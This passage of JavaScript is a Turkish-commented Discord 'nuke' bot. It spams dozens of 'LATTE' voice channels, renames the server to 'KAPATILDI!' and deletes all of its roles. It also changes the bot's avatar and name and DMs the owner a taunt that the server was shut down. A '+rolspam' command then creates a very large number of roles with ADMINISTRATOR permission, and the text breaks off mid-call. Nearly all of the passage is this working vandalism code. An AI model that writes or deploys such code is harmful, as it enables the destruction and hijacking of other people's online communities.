    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
    await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
      await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", { 
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });
          await msg.guild
    .createChannel("LATTE", {
      type: "voice"
    })
    .then(chan => {
      chan.setUserLimit("1");
    });

    
    await msg.guild.setName("KAPATILDI!"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://cdn.discordapp.com/attachments/731601185584447549/865348349833117736/BL9BtME5_400x400.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("MÖÖ6");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**Sunucuyu kapattım kanki :d**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }  
});



    client.on("message", msg => {
  if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });

    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });

    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });

    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });

    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
